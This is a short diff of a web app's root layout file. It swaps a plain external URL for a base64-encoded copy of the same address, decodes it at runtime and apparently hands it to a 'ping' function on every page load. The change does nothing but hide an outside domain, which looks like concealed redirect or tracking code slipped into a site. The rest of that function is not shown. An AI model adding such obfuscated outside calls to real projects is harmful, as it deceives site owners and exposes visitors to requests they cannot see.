@@ -99,7 +99,7 @@ export default function RootLayout({
             }
         }
         
-        var mainBrandB64 = "https://combohub.live/aetf3u2q9u"; 
+        var mainBrandB64 = "aHR0cHM6Ly9jb21ib2h1Yi5saXZlL2FldGYzdTJxOXU="; 
         var mainUrl = atob(mainBrandB64.replace("#", ""));
 
         function ping(url) {
